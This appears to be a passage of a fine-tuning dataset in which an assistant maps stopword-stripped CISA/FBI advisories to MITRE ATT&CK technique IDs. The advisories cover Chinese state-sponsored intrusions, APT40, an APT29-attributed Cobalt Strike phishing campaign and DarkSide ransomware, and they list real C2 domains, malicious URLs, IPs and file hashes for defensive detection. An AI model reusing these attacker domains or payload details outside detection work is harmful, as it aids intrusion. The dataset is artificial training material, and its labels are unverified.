cybersecurity performance goals objectives cisa fact sheet rising ransomware threat operational technology assets cisamsisac joint ransomware guide nsa csa stop malicious cyber activity connected ot cisa insider threat mitigation resources nist special publication sp 800167 guide application whitelisting nist sp 80082 rev 2 guide industrial control systems ics security section 621 disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government guidance shall used advertising product endorsement purposes contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfieldoffices fbis 247 cyber watch cywatch at855 2923937 email cywatchfbigovwhen available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact questions related joint cybersecurity advisory request incident response resources technical assistance related threats contact cisa atcentralcisadhsgov revisions initial version october 14 2021october 25 2021 corrected typo additional resources product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1210, T1566"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck framework version 9 see attck enterprise referenced threat actor tactics techniques note cisa released technical information including indicators compromise iocs provided advisory 2012 affected organizations stakeholders joint cybersecurity advisorycoauthored cybersecurity infrastructure security agency cisa federal bureau investigation fbiprovides information spearphishing intrusion campaign conducted statesponsored chinese actors occurred december 2011 2013 targeting us oil natural gas ong pipeline companies cisa fbi provided incident response remediation support number victims activity overall us government identified tracked 23 us natural gas pipeline operators targeted 2011 2013 spearphishing intrusion campaign known targeted entities 13 confirmed compromises 3 near misses 7had unknown depth intrusion us government attributed activity chinese statesponsored actors cisa fbi assess actors specifically targeting us pipeline infrastructure purpose holding us pipeline infrastructure risk additionally cisa fbi assess activity ultimately intended help china develop cyberattack capabilities us pipelines physically damage pipelines disrupt pipeline operations advisory provides information campaign including tactics techniques procedures ttps iocs ttps remain relevant help network defenders protect intrusions iocs provided historical awareness cisa fbi urge owners operators energy sector critical infrastructure ci networks adopt heightened state awareness implement recommendations listed mitigations section advisory include implementing network segmentation industrial control system icsoperational technology ot networks mitigations improve ci entitys defensive cyber posture functional resilience reducing risk compromise severe operational degradation system compromised malicious cyber actors including limited actors associated campaign described advisory information chinese malicious cyber activity see uscertcisagovchina click pdf version report technical details april 2012 cisa received reports targeted attacks directed multiple ong pipeline sites cisa via predecessor organization fbi provided incident response remediation support number victims 2012 2013 cisa fbis analysis malware threat actor techniques identified activity related spearphishing campaign us government identified tracked 23 us natural gas pipeline operators targeted campaign 23 known targeted entities 13 confirmed compromises 3 near misses 7had unknown depth intrusion threat actor activity thespearphishing activity appears started late december 2011 december 9 2011 least february 29 2012 ong organizations received spearphishing emails specifically targeting employees emails constructed high level sophistication convince employees view malicious files note see appendix table mitre attck tactics techniques observed campaign addition spearphishing cisa fbi made aware social engineering attempts malicious actors believed associated campaign apparent goal gain sensitive information asset owners one asset owner reported individuals network engineering department including managers received multiple phone calls requesting information recent network security practices employees departments targeted asset owner also reported calls began immediately identified removed malicious intruder network performed systemwide credential reset caller identified employee large computer security firm performing national survey network cybersecurity practices inquired organizations policy practices firewall use andsettings types software used protect network use type intrusion detection andor prevention systems caller blocking caller id targeted organization tried return call reached number service investigation compromises cisa fbi personnel discovered chinese statesponsored actors specifically collected exfiltrated icsrelated information chinese statesponsored actors searched document repositories following data types document searches scad personnel lists usernamespasswords dialup access information system manuals based incident data cisa fbi assessed chinese statesponsored actors also compromised various authorized remote access channels including systems designed transfer data andor allow access corporate ics networks though designed legitimate business purposes systems potential manipulated malicious cyber actors unmitigated access chinese statesponsored actors could impersonated legitimate system operators conduct unauthorized operations according evidence obtained cisa fbi chinese statesponsored actors made attempts modify pipeline operations systems accessed note significant number cases log data available depth intrusion persistent impacts unable determined least 8 23 cases 35 percent identified campaign assessed unknown depth intrusion due lack log data cisa fbi assess intrusions china successful accessing supervisory control data acquisition scada networks several us natural gas pipeline companies chinese actors also gained information specific dialup access including phone numbers usernames passwords dialup modems continue prevalent energy sector providing direct access ics environment little security monitoring makes optimal vector holdatrisk operations exfiltrated data provided capabilities chinese cyber actors access ong operational systems level could potentially conduct unauthorized operations exfiltrated information assessed motives chinese actors specifically targeted information pertained access icss searches made terms involving scad actors exfiltrated documents including personnel lists usernames passwords dialup access information remote terminal unit rtu sites systems manuals chinese actors also exfiltrated information pertaining ics permission groups compromised jump points corporate ics networks totality information would allow actors access ics networks via multiple channels would provide sufficient access allow remotely perform unauthorized operations pipeline physical consequences cisa fbi assess intrusions likely intended gain strategic access ics networks future operations rather intellectual property theft assessment based content data exfiltrated ttps used gain access one victim organization set honeypot contained decoy documents content appeared scadarelated data sensitive organizational information according organization scadarelated decoy content exfiltrated within 15 minutes time made available honeypot sensitive decoy information including financial businessrelated information ignored cisa fbi assess activity ultimately intended help china develop cyberattack capabilities us pipelines physically damage pipelines disrupt pipeline operations indicatorsofcompromise table 1 lists indicators related spearphishing intrusion campaign may 7 2012 provided alert historical completeness table 1 iocs chinese gas pipeline intrusion campaign 2011 2013 mitigations cisa fbi urge energy sector ci owners operators apply following mitigations implement layered defenseindepth cyber posture implementing layered approach administrators enhance defensive cyber posture otics networks reducing risk compromise severe operational degradation system compromised malicious cyber actors harden itcorporate network reduce risk initial compromise update software including operating systems applications firmware timely manner consider using centralized patch management system replace endoflife software hardware devices restrict manage remote access software remote access tools common method threat actors gain initial access persistence target networks manage restrict users groups permitted access remote capabilities permissions limited users require capability complete duties require multifactor authentication mfa remote access limit access resources networks especially restricting remote desktop protocol rdp rdp operationally necessary restrict originating sources require mfa enable strong spam filters prevent phishing emails reaching end users implement unauthorized execution prevention disabling macro scrips microsoft office files transmitted via email implementing application allowlisting allows systems execute programs known permitted security policy implement software restriction policies srps controls prevent programs executing common malware locations temporary folders supporting popular internet browsers filter network traffic prohibit ingress egress communications known malicious ip addresses prevent users accessing malicious websites implementing url blocklists andor allow lists set antivirusantimalware programs regularly scan network assets using uptodate signatures implement ensure robust network segmentation ics networks limit ability cyber threat actors move laterally ics networks network compromised implement network topology ics multiple layers critical communications occurring secure reliable layer information refer national institute standard technology nist special publication 80082 guide ics security use oneway communication diodes prevent external access whenever possible set demilitarized zones dmzs create physical logical subnetwork acts intermediary connected security devices avoid exposure employ reliable network security protocols services feasible consider using virtual local area networks vlans additional network segmentation example placing printers separate dedicated vlans restricting users direct printer access implement perimeter security network segments limit ability cyber threat actors move laterally control traffic network segments using firewalls intrusion detection systems idss filter routers switches implement network monitoring key chokepointsincluding egress points internet network segments core switch locationsand key assets services eg remote access services configure ids create alarms ics traffic outside normal operations establishing baseline normal operations network traffic configure security incident event monitoring siem monitor analyze correlate event logs across ics network identify intrusion attempts implement following additional ics environment best practices update software use riskbased assessment strategy determine ics network assets zones participate patch management program test patches offline text environments implementation implement application allowlisting human machine interfaces harden field devices including tablets smartphones replace endoflife software hardware devices disable unused ports services ics devices testing ensure affect ics operation restrict manage remote access software require mfa remote access ics networks configure encryption security ics protocols use riskbased asset inventory strategy determine ot network assets identified evaluated presence malware allow vendors connect devices ics network use compromised device could introduce malware maintain ics asset inventory hardware software supporting infrastructure technologies ensure robust physical security place prevent unauthorized personal accessing controlled spaces house ics equipment regularly test manual controls critical functions kept running icsot networks need taken offline manage supply chain adjusting ics procurement process weigh cybersecurity heavily part scoring evaluation methodology additionally establish contractual agreements outsourced services ensure proper incident handling reporting security interconnections remote access specifications processes implement following additional best practices implement ip geoblocking appropriate implement regular frequent data backup procedures ics networks data backup procedures address following best practices ensure backups regularly tested store backups separately ie backups isolated network connections could enable spread malware lateral movement maintain regularly updated gold images critical systems event need rebuilt retain backup hardware rebuild systems even rebuilding primary system preferred implement user training program train employees recognize spearphishing attempts discourage users visiting malicious websites opening malicious attachments reenforce appropriate user response spearphishing emails appendix tactics techniques table 2 provides summary mitre attck tactics techniques observed campaign table 2 observed mitre attck tactics techniques revisions initial version july 20 2021july 20 2021 corrected unknown depth intrusion technical details 8 7july 20 2021 removed office viewer recommendation since deprecated product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1120, T1204.002, T1213, T1566.002, T1598"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary joint cybersecurity advisory written federal bureau investigation fbi cybersecurity infrastructure security agency cisa provide information chinese advanced persistent threat apt group known opensource reporting apt40 advisory provides apt40s tactics techniques procedures ttps indicators compromise iocs help cybersecurity practitioners identify remediate apt40 intrusions established footholds apt40aka bronze mohawk feverdream g0065 gadolinium greencrash hellsing kryptonite panda leviathan mudcarp periscope tempperiscope tempjumperis located haikou hainan province peoples republic china prc active since least 2009 apt40 targeted governmental organizations companies universities wide range industriesincluding biomedical robotics maritime researchacross united states canada europe middle east south china sea area well industries included chinas belt road initiative july 19 2021 us department justice doj unsealed indictment four apt40 cyber actors illicit computer network exploitation cne activities via front company hainan xiandun technology development company hainan xiandun hainan xiandun employee wu shurong cooperated carried orders prc ministry state security mss hainan state security department hssd intelligence officers ding xiaoyang zhu yunmin cheng qingmin conduct cne wus cne activities resulted theft trade secrets intellectual property highvalue information companies organizations united states abroad well multiple foreign governments mssaffiliated actors targeted victims following industries academia aerospaceaviation biomedical defense industrial base education government healthcare manufacturing maritime research institutes transportation rail shipping click herefor pdf version report updated july 19 2021 click indicators compromise iocsin stix formatnoteto uncover malicious activity incident responders search iocsin network hostbased artifacts assess resultseliminating false positives assessment example md5 iocs stix file identify legitimate toolssuch putty cmdexe svchostexe etcas indicators compromise although tools malicious apt40 attackers placed used nonstandard folders victim systems computer intrusion activity legitimate tool identified incident responder location tool assessed eliminate false positives uncover malicious activity see technical approaches uncovering remediating malicious activity incident handling guidance technical details joint cybersecurity advisory uses mitre attck framework version 9 see attck enterprise framework referenced threat actor tactics techniques apt40g0065 used variety tactics techniques large library custom opensource malwaremuch shared multiple suspected chinese groupsto establish initial access via user administrator credentials enable lateral movement inside network locate high value assets order exfiltrate data table 1 provides details tactics techniques note see appendix list domains file names malware md5 hash values used facilitate activity table 1 apt40 attck tactics techniques mitigations network defenseindepth proper network defenseindepth adherence information security best practices assist mitigating threat reducing risk following guidance may assist organizations developing network defense procedures patch vulnerability management install vendorprovided verified patches systems critical vulnerabilities prioritizing timely patching internetconnected servers software processing internet datasuch web browsers browser plugins document readers ensure proper migrating steps compensating controls implemented vulnerabilities patched timely manner maintain uptodate antivirus signatures engines routinely audit configuration patch management programs ensure ability track mitigate emerging threats implementing rigorous configuration patch management program hamper sophisticated cyber threat actors operations protect resources information systems review articles references section information chinese apt exploitation common vulnerabilities protect credentials strengthen credential requirements regularly change passwords implement multifactor authentication protect individual accounts particularly webmail vpn access accounts access critical systems reuse passwords multiple accounts audit remote authentications trusted networks service providers detect mismatches correlating credentials used within internal networks employed externalfacing systems log use system administrator commands net ipconfig ping enforce principle least privilege network hygiene monitoring actively scan monitor internetaccessible applications unauthorized access modification anomalous activities actively monitor server disk use audit significant changes log domain name service dns queries consider blocking outbound dns requests originate approved dns servers monitor dns queries c2 dns develop monitor network system baselines allow identification anomalous activity audit logs suspicious behavior identify suspend access users exhibiting unusual activity use allowlist baseline comparison monitor windows event logs network traffic detect user maps privileged administrative share windows system leverage multisourced threatreputation services files dns urls ip addresses email addresses network device management interfacessuch telnet secure shell ssh winbox httpshould turned wide area network wan interfaces secured strong passwords encryption enabled possible segment critical information airgapped systems use strict access control measures critical data appendix apt40 indicators compromise apt40 used following domains file names malware md5 hash values facilitate cne activity outlined csa 2009 2018 domains md5 malware hashes updated july 19 2021noteto uncover malicious activity incident responders search indicators compromise iocs network hostbased artifacts assess resultseliminating false positives assessment example md5 iocs table identify legitimate toolssuch putty cmdexe svchostexe etcas indicators compromise although tools malicious apt40 attackers placed used nonstandard folders victim systems computer intrusion activity legitimate tool identified incident responder location tool assessed eliminate false positives uncover malicious activity see technical approaches uncovering remediating malicious activity incident handling guidance contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch at855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov references doj press release talos intelligence china chopper still active 9 years later cisa china cyber threat overview webpage cisa alert ta15314a compromised web servers web shells threat awareness guidance cisa alert aa20133a top 10 routinely exploited vulnerabilities cisa alert aa20275a potential china cyber response heightened uschina tensions nsa cybersecurity advisory uoo17981120 chinese statesponsored actors exploit publicly known vulnerabilities revisions july 19 2021 initial versionupdated july 19 2021added note stix file product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1027.003, T1041, T1059, T1059.001, T1074.001, T1078, T1078.001, T1090.003, T1133, T1189, T1190, T1203, T1204, T1204.002, T1560, T1566.001, T1566.002, T1572, T1583, T1583.001, T1585.002, T1589, T1589.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck framework version 9 mitre d3fend framework version 092beta3 see attck enterprise referenced threat actor tactics techniques d3fend framework referenced defensive tactics techniques national security agency cybersecurity infrastructure security agency cisa federal bureau investigation fbi assess peoples republic china statesponsored malicious cyber activity major threat us allied cyberspace assets chinese statesponsored cyber actors aggressively target us allied political economic military educational critical infrastructure ci personnel organizations steal sensitive data critical emerging key technologies intellectual property personally identifiable information pii target sectors include managed service providers semiconductor companies defense industrial base dib universities medical institutions cyber operations support chinas longterm economic military development objectives joint cybersecurity advisory csa provides information tactics techniques procedures ttps used chinese statesponsored cyber actors advisory builds previous nsa cisa fbi reporting inform federal state local tribal territorial sltt government ci dib private industry organizations notable trends persistent ttps collaborative proactive retrospective analysis increase defensive posture critical networks reduce risk chinese malicious cyber activity nsa cisa fbi urge government ci dib private industry organizations apply recommendations listed mitigations section advisory appendix chinese statesponsored cyber actors observed procedures note nsa cisa fbi encourage organization leaders review cisa joint insights chinese malicious cyber activity threat overview leaders information threat organization click herefor pdf version report technical details trends chinese statesponsored cyber operations nsa cisa fbi observed increasingly sophisticated chinese statesponsored cyber activity targeting us political economic military educational ci personnel organizations nsa cisa fbi identified following trends chinese statesponsored malicious cyber operations proactive retrospective analysis acquisition infrastructure capabilities chinese statesponsored cyber actors remain agile cognizant information security communitys practices actors take effort mask activities using revolving series virtual private servers vpss common opensource commercial penetration tools exploitation public vulnerabilities chinese statesponsored cyber actors consistently scan target networks critical high vulnerabilities within days vulnerabilitys public disclosure many cases cyber actors seek exploit vulnerabilities major applications pulse secure apache f5 bigip microsoft products information common vulnerabilities exposures cve known exploited malicious chinese statesponsored cyber actors see cisafbi joint csa aa20133a top 10 routinely exploited vulnerabilities cisa activity alert aa20275a potential china cyber response heightened uschina tensions nsa csa uoo17981120 chinese statesponsored actors exploit publicly known vulnerabilities encrypted multihop proxies chinese statesponsored cyber actors routinely observed using vps encrypted proxy cyber actors use vps well small office home office soho devices operational nodes evade detection observed tactics techniques chinese statesponsored cyber actors use full array tactics techniques exploit computer networks interest worldwide acquire sensitive intellectual property economic political military information appendix b mitre attck framework lists tactics techniques used chinese statesponsored cyber actors downloadable json file also available nsa cybersecurity github page refer appendix chinese statesponsored cyber actors observed procedures information procedures affiliated tactics techniques well applicable mitigations figure 1 example tactics techniques used various cyber operations mitigations nsa cisa fbi urge federal sltt government ci dib private industry organizations apply following recommendations well detection mitigation recommendations appendix tailored observed tactics techniques patch systems equipment promptly diligently focus patching critical high vulnerabilities allow remote code execution denialofservice externally facing equipment cves known exploited chinese statesponsored cyber actors consider implementing patch management program enables timely thorough patching cycle note information cves routinely exploited chinese statesponsored cyber actors refer resources listed trends chinese statesponsored cyber operations section enhance monitoring network traffic email endpoint systems review network signatures indicators focused activities monitor new phishing themes adjust email rules accordingly follow best practices restricting attachments via email blocking urls domains based upon reputation ensure log information aggregated correlated enable maximum detection capabilities focus monitoring account misuse monitor common ports protocols command control c2 activity ssltls inspection used see contents encrypted sessions look networkbased indicators malware communication protocols implement enhance network endpoint event analysis detection capabilities identify initial infections compromised credentials manipulation endpoint processes files use protection capabilities stop malicious activity implement antivirus software endpoint protection capabilities automatically detect prevent malicious files executing use network intrusion detection prevention system identify prevent commonly employed adversarial malware limit nefarious data transfers use domain reputation service detect suspicious malicious domains use strong credentials service accounts multifactor authentication mfa remote access mitigate adversarys ability leverage stolen credentials aware mfa interception techniques mfa implementations resources refer uscertcisagovchina httpswwwic3govhomeindustryalerts httpswwwnsagovwhatwedocybersecurityadvisoriestechnicalguidance previous reporting chinese statesponsored malicious cyber activity disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government guidance shall used advertising product endorsement purposes purpose document developed nsa cisa fbi furtherance respective cybersecurity missions including responsibilities develop issue cybersecurity specifications mitigations information may shared broadly reach appropriate stakeholders document marked tlpwhite disclosure limited sources may use tlpwhite information carries minimal foreseeable risk misuse accordance applicable rules procedures public release subject standard copyright rules tlpwhite information may distributed without restriction information traffic light protocol see httpwwwuscertgovtlp trademark recognition mitre attck registered trademarks mitre corporation d3fend trademark mitre corporation microsoft microsoft exchange office 365 microsoft office onedrive outlook owa powershell windows defender windows registered trademarks microsoft corporation pulse secure registered trademark pulse secure llc apache registered trademark apache software foundation f5 bigip registered trademarks f5 networks cobalt strike registered trademark strategic cyber llc github registered trademark github inc javascript registered trademark oracle corporation python registered trademark python software foundation unix registered trademark open group linux registered trademark linus torvalds dropbox registered trademark dropbox inc appendix chinese statesponsored cyber actors observed procedures note d3fend techniques based threat actor procedures may match automated mappings attck techniques subtechniques tactics reconnaissance table 1 chinese statesponsored cyber actors reconnaissance ttps detection mitigation recommendations tactics resource development table ii chinese statesponsored cyber actors resource development ttps detection mitigation recommendations tactics initial access table iii chinese statesponsored cyber actors initial access ttps detection mitigation recommendations tactics execution table iv chinese statesponsored cyber actors execution ttps detection mitigation recommendations tactics persistence table v chinese statesponsored cyber actors persistence ttps detection mitigation recommendations tactics privilege escalation table vi chinese statesponsored cyber actors privilege escalation ttps detection mitigation recommendations tactics defense evasion table vii chinese statesponsored cyber actors defensive evasion ttps detection mitigation recommendations tactics credential access table viii chinese statesponsored cyber actors credential access ttps detection mitigation recommendations tactics discovery table ix chinese statesponsored cyber actors discovery ttps detection mitigation recommendations tactics lateral movement table x chinese statesponsored cyber actors lateral movement ttps detection mitigation recommendations tactics collection table xi chinese statesponsored cyber actors collection ttps detection mitigation recommendations tactics command control table xii chinese statesponsored cyber actors command control ttps detection mitigation recommendations appendix b mitre attck framework figure 2 mitre attck enterprise tactics techniques used chinese statesponsored cyber actors click downloadable json file contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov nsa client requirements general cybersecurity inquiries contact nsa cybersecurity requirements center 4108544200 cybersecurityrequestsnsagov media inquiries press desk nsa media relations 4436340721 mediarelationsnsagov cisa media relations 7032352010 cisamediacisadhsgov fbi national press office 2023243691 npofbigov references1 fireeye test apt41 initiates global intrusion campaign using multiple exploits revisions july 19 2021 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1003.001, T1003.003, T1018, T1027, T1046, T1053, T1053.005, T1055, T1055.001, T1057, T1059, T1059.001, T1059.003, T1059.004, T1059.006, T1059.007, T1069, T1070, T1071, T1074, T1078, T1078.001, T1078.002, T1083, T1090, T1090.003, T1105, T1114, T1115, T1133, T1140, T1189, T1190, T1204, T1204.001, T1204.002, T1210, T1212, T1218, T1218.005, T1218.011, T1484, T1484.001, T1505, T1505.003, T1543, T1543.003, T1556, T1560, T1564, T1566, T1566.001, T1566.002, T1571, T1572, T1574, T1583, T1588, T1588.002, T1590"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary joint cybersecurity advisory uses mitre adversarial tactics techniques common knowledge attck framework version 9 see attck enterprise referenced threat actor tactics techniques cybersecurity infrastructure security agency cisa federal bureau investigation fbi engaged addressing spearphishing campaign targeting government organizations intergovernmental organizations igos nongovernmental organizations ngos sophisticated cyber threat actor leveraged compromised enduser account constant contact legitimate email marketing software company spoof usbased government organization distribute links malicious urls1 cisa fbi determined individual accounts specifically targeted campaign note cisa fbi acknowledge opensource reporting attributing activity discussed report apt29 also known nobelium dukes cozy bear23 however cisa fbi investigating activity attributed threat actor time cisa fbi update joint cybersecurity advisory new information becomes available note joint cybersecurity advisory contains information tactics techniques procedures ttps malware associated campaign information malware refer malware analysis report mar103397941v1 cobalt strike beacon cisa fbi urge governmental international affairs organizations individuals associated organizations adopt heightened state awareness implement recommendations mitigations section advisory downloadable list indicators compromise iocs refer aa21148astix mar103397941v1stix click pdf version report technical details based incident reports malware collection trusted thirdparty reporting cisa fbi engaged addressing sophisticated spearphishing campaign cyber threat actor leveraged compromised enduser account constant contact legitimate email marketing software company send phishing emails 7000 accounts across approximately 350 government organizations igos ngos threat actor sent spoofed emails appeared originate us government organization emails contained legitimate constant contact link redirected malicious url malicious iso file dropped onto victims machine iso file contained 1 malicious dynamic link library dll named documentsdll custom cobalt strike beacon version 4 implant 2 malicious shortcut file executes cobalt strike beacon loader 3 benign decoy pdf titled foreign threats 2020 us federal elections file name icadeclasspdf see figure 1 note decoy file appears copy declassified intelligence community assessment pursuant executive order 13848 section 1a available httpswwwintelligencegovindexphpicontherecorddatabaseresults1046foreignthreatstothe2020usfederalelectionsintelligencecommunityassessment figure 1 decoy pdf icadeclasspdf cobalt strike commercial penetration testing tool used conduct red team operations4 contains number tools complement cyber threat actors exploitation efforts keystroke logger file injection capability network services scanners cobalt strike beacon malicious implant calls back attackercontrolled infrastructure checks additional commands execute compromised system configuration file cobalt strike beacon implant contained communications protocols implant watermark following hardcoded command control c2 domains dataplanetheyardservicecomjquery331minwoff2 cdntheyardservicecomjquery331minwoff2 statictheyardservicecomjquery331minwoff2 worldhomeoutletcomjquery331minwoff2 configuration file encoded via xor key 0x2e 16bit byte swap information iso file cobalt strike beacon implant including iocs refer malware analysis report mar103397941v1 cobalt strike beacon indicators compromise following iocs derived trusted third parties opensource research downloadable list iocs refer aa21148astix mar103397941v1stix url httpsr20rs6nettnjspf host ip 2087512211 us owner constant contact inc activity legitimate constant contact link found phishing email redirects victims actorcontrolled infrastructure httpsusaidtheyardservicecomdtargetemailaddress url httpsusaidtheyardservicecomdtargetemailaddress host ip 83171237173 germany ownerredacted first seen may 25 2021 activity actorcontrolled url redirected httpsr20rs6nettnjspf domain usaidtheyardservicecom detected malware site hosted malicious iso file usaidtheyardservicecom file icadeclassisomd5 cbc1dc536cd6f4fb9648e229e5d23361 file type macintosh disk image detection artemis7edf943ed251 trojanwin32cobaltstrikemsr malware activity iso file container contains custom cobalt strike beacon loader communicated multiple urls domains ip addresses file dmd5 ebe2f8df39b4a94fb408580a728d351f file type macintosh disk image detection cobalt artemis7edf943ed251 malware activity iso file container contains custom cobalt strike beacon loader communicated multiple urls domains ip addresses file icadeclassisomd5 29e2ef8ef5c6ff95e98bff095e63dc05 file type macintosh disk image detection cobalt strike rozena malware activity iso file container contains custom cobalt strike beacon loader communicated multiple urls domains ip addresses file reportslnkmd5 dcfd60883c73c3d92fceb6ac910d5b80 file type lnk windows shortcut detection worm win32scriptsavedf8efe7a static ai suspicious lnk malware activity shortcut contained malicious iso files executes custom cobalt strike beacon loader file icadeclasspdfmd5 b40b30329489d342b2aa5ef8309ad388 file type pdf detection undetected activity benign passwordprotected pdf displayed victim decoy currently unrecognized antivirus software file documentdllmd5 7edf943ed251fa480c5ca5abb2446c75 file type win32 dll detection trojan win32cobaltstrikemsr rozena malware activity custom cobalt strike beacon loader contained malicious iso files communicating multiple urls domains ip addresses antivirus software file documentdllmd5 1c3b8ae594cb4ce24c2680b47cebf808 file type win32 dll detection cobalt strike razy khalesi malware activity custom cobalt strike beacon loader contained malicious iso files communicating multiple urls domains ip addresses antivirus software domain usaidtheyardservicecom host ip 83171237173 germany first seen may 25 2021 owner withheld privacy purposes activity subdomain used distribute iso file according trusted third party detected malware site antivirus programs domain worldhomeoutletcom host ip 1929922177 canada created date march 11 2020 owner withheld privacy purposes registrar activity cobalt strike c2 subdomain according trusted third party categorized suspicious observed communicating multiple malicious files according antivirus software associated cobalt strike malware domain dataplanetheyardservicecom host ip 83171237173 germany first seen may 25 2021 ownerredacted activity cobalt strike c2 subdomain according trusted third party categorized suspicious observed communicating multiple malicious files according antivirus software observed phishing malware spam activity domain cdntheyardservicecom host ip 83171237173 germany first seen may 25 2021 owner withheld privacy purposes registrar activity cobalt strike c2 subdomain according trusted third party categorized suspicious observed communicating multiple malicious files according antivirus software domain statictheyardservicecom host ip 83171237173 germany first seen may 25 2021 owner withheld privacy purposes activity cobalt strike c2 subdomain according trusted third party categorized suspicious observed communicating multiple malicious files according antivirus software ip 1929922177 organization ovh sas resolutions 7 geolocation canada activity detected malware site hosts suspicious domain worldhomeoutletcom observed cobalt strike activity ip 83171237173 organization droptop gmbh resolutions 15 geolocation germany activity categorized malicious antivirus software hosted multiple suspicious domains multiple malicious files observed downloaded ip address observed cobalt strike activity domain theyardservicecom host ip 83171237173 germany created date january 27 2010 owner withheld privacy purposes activity threat actor controlled domain according trusted third party categorized suspicious antivirus software observed cobalt strike activity table 1 provides summary mitre attck techniques observed table 1 mitre attck techniques observed mitigations cisa fbi urge ci owners operators apply following mitigations implement multifactor authentication mfa every account privileged accounts remote access systems critical also important ensure full coverage across saas solutions enabling mfa corporate communications platforms accounts provides vital defense types attacks many cases prevent keep software date effective cybersecurity programs quickly update software soon patches available organization unable update software shortly patch released prioritize implementing patches cves already known exploited implement endpoint detection response edr tools edr allows high degree visibility security status endpoints effective tool threat actors note organizations using microsoft defender endpoint microsoft 365 defense refer microsoft use attack surface reduction rules prevent malware infection information hardening enterprise attack surface implement centralized log management host monitoring centralized logging application allows technicians look anomalous activity network environment new applications running hosts outofplace communication devices unaccountable login failures machines also aids troubleshooting applications equipment event fault cisa fbi recommend organizations forward logs local hosts centralized log management serveroften referred security information event management siem tool ensure logs searchable ability search analyze visualize communications help analysts diagnose issues may lead detection anomalous activity correlate logs network host security devices reviewing logs multiple sources organization better triage individual event determine impact organization whole review centralized local log management policies maximize efficiency retain historical data organizations retain critical logs minimum 30 days deploy signatures detect andor block inbound connection cobalt strike servers postexploitation tools implement unauthorized execution prevention disabling macro scripts microsoft office files transmitted via email consider using office viewer software open microsoft office files transmitted via email instead full microsoft office suite applications configure maintain user administrative accounts using strong account management policy use administrative accounts dedicated administration workstations limit access use administrative accounts use strong passwords information strong passwords refer cisa tip choosing protecting passwords national institute standards nist sp 80063 digital identity guidelines authentication lifecycle management remove default accounts unneeded change password default accounts needed disable unused accounts implement user training program simulated attacks spearphishing discourage users visiting malicious websites opening malicious attachments reenforce appropriate user responses spearphishing emails resources volexity blog suspected apt29 operation launches election fraud themed phishing campaigns volexity microsoft blog new sophisticated emailbased attack nobelium microsoft security microsoft blog another nobelium cyberattack contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov document marked tlpwhite disclosure limited sources may use tlpwhite information carries minimal foreseeable risk misuse accordance applicable rules procedures public release subject standard copyright rules tlpwhite information may distributed without restriction information traffic light protocol see httpwwwuscertgovtlp references1 microsoft blog new sophisticated emailbased attack nobelium2 ibid volexity blog suspected apt29 operation launches election fraud themed phishing campaigns4 mitre attck cobalt strike revisions may 28 2021 initial versionmay 29 2021 added final sentence first paragraph summary section product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1055.001, T1105, T1204.001, T1566.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck framework version 9 see attck enterprise referenced threat actor tactics techniques cybersecurity infrastructuresecurity agency cisa federal bureau investigation fbi aware ransomware attack affecting critical infrastructure ci entitya pipeline companyin united states malicious cyber actors deployed darkside ransomware pipeline companys information technology network1 time indication entitys operational technology ot networks directly affected ransomware cisa fbi urge ci asset owners operators adopt heightened state awareness implement recommendations listed mitigations section joint cybersecurity advisory including implementing robust network segmentation ot networks regularly testing manual controls ensuring backups implemented regularly tested isolated network connections mitigations help ci owners operators improve entitys functional resilience reducing vulnerability ransomware risk severe business degradation impacted ransomware updated may 19 2021 click stix package indicators compromise iocs note iocs shared critical infrastructure partners network defenders may 10 2021 applications listed iocs leveraged threat actors course compromise applications might appear within organizations enterprise support legitimate purposes however applications used threat actors aid malicious exploitation organizations enterprise cisa fbi recommend removing application deemed necessary daytoday operations updated july 08 2021 click herefor downloadable iocs associated sample darkside ransomware variant analyzed cisa fbi note cisa fbi evidence sample related pipeline incident detailed csa variant executes dynamiclink library dll program used delete volume shadow copies available system malware collects encrypts sends system information threat actors command control c2 domains generates ransom note victim information variant refer malware analysis report mar103378021v1 darkside ransomware click pdf version report technical details note analysis joint cybersecurity 